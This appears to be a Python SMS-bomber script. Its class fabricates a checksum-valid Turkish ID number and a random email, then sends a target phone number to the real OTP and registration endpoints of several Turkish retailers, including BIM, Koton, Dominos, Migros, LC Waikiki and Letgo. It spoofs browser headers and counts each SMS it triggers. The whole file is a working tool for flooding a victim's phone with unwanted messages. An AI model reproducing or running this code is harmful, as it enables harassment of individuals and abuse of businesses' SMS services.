import requests
from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style

class SendSms():
    adet = 0
    
    def __init__(self, phone, mail=""):
        rakam = []
        tcNo = ""
        rakam.append(randint(1,9))
        for i in range(1, 9):
            rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"

    def Bim(self):
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "application/json",
                "Origin": "https://www.bim.com.tr",
                "Referer": "https://www.bim.com.tr/"
            }
            bim = requests.post(
                "https://bim.veesk.net/service/v1.0/account/login", 
                json={"phone": self.phone}, 
                headers=headers, 
                timeout=6
            )
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> BIM")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> BIM")

    def Koton(self):
        try:
            url = "https://www.koton.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk", "User-Agent": "Koton/1"}
            data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
            r = requests.post(url, headers=headers, data=data, timeout=6)
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> koton.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> koton.com")

    def KahveDunyasi(self):    
        try:    
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "Origin": "https://www.kahvedunyasi.com", "Referer": "https://www.kahvedunyasi.com/"}
            json={"countryCode": "90", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["processStatus"] == "Success":
                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> api.kahvedunyasi.com")
                self.adet += 1
            else:
                raise
        except:    
            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> api.kahvedunyasi.com")

    def Dominos(self):
        try:
            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
            headers = {"Content-Type": "application/json;charset=utf-8", "User-Agent": "Dominos/7.1.0"}
            json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> frontend.dominos.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> frontend.dominos.com.tr")

    def File(self):
        try:
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            headers = {"Content-Type": "application/json", "User-Agent": "filemarket"}
            json={"mobilePhoneNumber": f"90{self.phone}"}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["responseType"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> api.filemarket.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> api.filemarket.com.tr")

    def Metro(self):
        try:
            url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
            headers = {"Content-Type": "application/json; charset=utf-8", "User-Agent": "Metro Turkiye"}
            json={"methodType": "2", "mobilePhoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["status"] == "success":
                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> mobile.metro-tr.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> mobile.metro-tr.com")

    def LcWaikiki(self):
        try:
            url = "https://www.lcw.com/tr/ajax/authentication/preregister"
            headers = {"content-type": "application/json", "origin": "https://www.lcw.com", "referer": "https://www.lcw.com/uye-ol", "user-agent": "Mozilla/5.0"}
            json_data = {
                "RegisterFormView": {
                    "RegisterPhoneNumber": self.phone,
                    "RegisterEmail": self.mail,
                    "Password": "31ABC..abc31",
                    "IsEmailChecked": False,
                    "IsSmsChecked": True,
                    "IsCallChecked": False,
                    "IsMemberPrivacyRequired": True,
                    "IsExplicitConsent": True,
                    "ActivationCode": "",
                    "CaptchaCode": "",
                    "PhoneAreaCode": "0090",
                    "Referer": None,
                    "RecaptchaToken": ""
                }
            }
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> lcw.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> lcw.com")

    def Migros(self):
        try:
            url = "https://www.migros.com.tr/rest/user-bff/auth/single-login/otp"
            headers = {"Content-Type": "application/json", "Origin": "https://www.migros.com.tr", "Referer": "https://www.migros.com.tr/", "User-Agent": "Mozilla/5.0"}
            json_data = {"phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> migros.com.tr")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> migros.com.tr")

    def Letgo(self):
        try:
            url = "https://www.letgo.com/api/auth/challenges"
            headers = {"Content-Type": "application/json", "Origin": "https://www.letgo.com", "Referer": "https://www.letgo.com/", "User-Agent": "Mozilla/5.0"}
            json_data = {"phone": f"+90{self.phone}"}
            r = requests.post(url, headers=headers, json=json_data, timeout=6)
            if r.json().get("success") == True:
                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}SMS Gönderildi! {self.phone} --> letgo.com")
                self.adet += 1
            else:
                raise Exception()
        except:
            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}SMS Gönderilemedi! {self.phone} --> letgo.com")
